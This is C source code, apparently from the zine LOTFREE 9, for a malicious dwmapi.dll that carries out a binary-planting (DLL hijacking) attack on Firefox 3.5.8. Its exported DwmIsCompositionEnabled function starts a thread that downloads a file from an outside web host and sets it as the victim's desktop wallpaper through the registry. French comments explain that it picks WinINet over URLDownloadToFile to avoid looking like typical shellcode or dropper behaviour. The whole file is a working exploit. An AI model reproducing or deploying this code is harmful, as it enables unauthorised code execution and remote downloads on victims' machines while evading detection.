/* LOTFREE 9 binary planting hassle attack
 * dwmapi.dll pour firefox 3.5.8
 */
#include <windows.h>
/* Pour les fonctions InternetOpen*
 * On n'utilise pas URLDownloadToFile
 * qui necessite urlmon.dll et est generalement
 * utilise dans les shellcodes et droppers
 * donc suspicieux.
 */
#include <wininet.h>

#define DllExport extern "C" __declspec (dllexport)

int pwn()
{
    HKEY handle;
    DWORD dwDisp;
    HINTERNET hnet;
    HINTERNET hurl;
    char buffer[4096];
    DWORD dwRead = 0, dwWrite;
    HANDLE fichier;
    wchar_t image[] = L"http://www.4everload.com/index.php/Images/Large/c04dae705525/David_Hasselhoff.bmp";
    wchar_t tempdir[255];

    GetTempPathW(245, tempdir);
    wcscat(tempdir, L"img.bmp");


    hnet = InternetOpenW(L"Mozilla", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    hurl = InternetOpenUrlW(hnet,
                            image,
                            NULL,
                            0,
                            0,
                            0);
    fichier = CreateFileW(tempdir, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    while(InternetReadFile(hurl, buffer, 4096, &dwRead))
    {
        if(dwRead == 0) break;
        WriteFile(fichier, buffer, dwRead, &dwWrite, NULL);
    }
    CloseHandle(fichier);
    InternetCloseHandle(hurl);
    InternetCloseHandle(hnet);

    RegCreateKeyExW(HKEY_CURRENT_USER,
                       L"Control Panel\\Desktop\\Wallpaper",
                       0,
                       NULL,
                       0,
                       KEY_ALL_ACCESS,
                       NULL,
                       &handle,
                       &dwDisp);
    RegSetValueExW(handle, L"Wallpaper", 0, REG_SZ, (LPBYTE)tempdir, wcslen(tempdir)*sizeof(wchar_t));
    RegCloseKey(handle);

    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)tempdir, SPIF_UPDATEINIFILE|SPIF_SENDCHANGE);
    return 0;
}

DWORD WINAPI ThreadProc(LPVOID lpParameter)
{
	pwn();
	return 0;
}

DllExport void DwmIsCompositionEnabled() {
    /*
    Via http://msdn.microsoft.com/en-us/library/windows/desktop/aa385098(v=VS.85).aspx
    La doc de InternetOpen* indique :
    Like all other aspects of the WinINet API, this function cannot be safely
    called from within DllMain or the constructors and destructors of global objects.
    Du coup on fait appel a un thread pour passer outre.
    */
    CreateThread(NULL, NULL, ThreadProc, NULL, NULL, NULL);
    return;
}


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    return 0;
}
